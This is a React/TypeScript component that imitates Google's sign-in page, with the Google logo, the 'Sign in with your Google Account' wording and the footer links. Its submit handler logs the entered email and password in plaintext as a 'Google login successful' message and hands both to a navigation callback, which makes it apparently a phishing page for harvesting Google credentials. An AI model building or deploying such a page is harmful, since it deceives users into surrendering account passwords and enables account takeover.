import { useState } from "react";

interface LoginPageProps {
  onNavigate: (email: string, password: string) => void;
}

export default function LoginPage({ onNavigate }: LoginPageProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Google login successful with:", { email, password });
    setLoading(true);
    // Simulate loading then navigate
    setTimeout(() => {
      onNavigate(email, password);
    }, 800);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f0f4f9] px-4 py-8">
      {loading && (
        <div className="fixed inset-0 bg-white z-50 flex items-center justify-center">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
          </div>
        </div>
      )}
      <div className="w-full max-w-[900px]">
        {/* Main Card Container */}
        <div className="bg-white rounded-2xl shadow-md overflow-hidden">
          <div className="flex flex-col md:flex-row">
            {/* Left Side - Logo and Text */}
            <div className="flex-1 p-8 md:p-10 flex flex-col justify-start pt-10 md:pt-12">
              <div>
                <svg className="h-10 w-10 mb-6" viewBox="0 0 48 48">
                  <path
                    fill="#EA4335"
                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
                  />
                  <path
                    fill="#4285F4"
                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
                  />
                  <path
                    fill="#FBBC05"
                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
                  />
                  <path
                    fill="#34A853"
                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
                  />
                  <path fill="none" d="M0 0h48v48H0z" />
                </svg>
                <h1 className="text-[32px] font-medium text-gray-900 mb-3">
                  Sign in
                </h1>
                <p className="text-[16px] font-normal text-gray-800 leading-relaxed">
                  with your Google Account. This account will be available to
                  other Google apps in the browser.
                </p>
              </div>
            </div>
    
            {/* Right Side - Form */}
            <div className="flex-1 p-8 md:p-10 flex flex-col justify-center bg-white">
              <form onSubmit={handleSubmit} className="space-y-5 mt-8">
                {/* Email Input */}
                <div>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email or phone"
                    className="w-full px-4 py-3 border border-gray-300 rounded text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                    required
                  />
                </div>

                {/* Password Input */}
                <div>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    className="w-full px-4 py-3 border border-gray-300 rounded text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                    required
                  />
                </div>

                {/* Forgot Email Link */}
                <div>
                  <a
                    href="#"
                    className="text-sm font-medium text-blue-600 hover:underline"
                  >
                    Forgot email?
                  </a>
                </div>

                {/* Guest Mode Info */}
                <div className="pt-2">
                  <p className="text-sm text-gray-700">
                    Not your computer? Use Guest mode to sign in privately.{" "}
                    <a
                      href="#"
                      className="text-blue-600 font-medium hover:underline"
                    >
                      Learn more about using Guest mode
                    </a>
                  </p>
                </div>

                {/* Action Buttons */}
                <div className="flex items-center justify-end gap-4 pt-4">
                  <a
                    href="#"
                    className="text-sm font-medium text-blue-600 hover:underline"
                  >
                    Create account
                  </a>
                  <button
                    type="submit"
                    className="px-6 py-2.5 bg-blue-600 text-white text-sm font-medium rounded-full hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 transition-colors shadow-sm hover:shadow"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-6 px-4">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-600">
            <select className="bg-transparent border-none text-xs text-gray-600 cursor-pointer focus:outline-none order-2 sm:order-1">
              <option>English (United States)</option>
              <option>Español</option>
              <option>Français</option>
              <option>Deutsch</option>
            </select>
            <div className="flex gap-6 order-1 sm:order-2">
              <a href="#" className="hover:underline">
                Help
              </a>
              <a href="#" className="hover:underline">
                Privacy
              </a>
              <a href="#" className="hover:underline">
                Terms
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
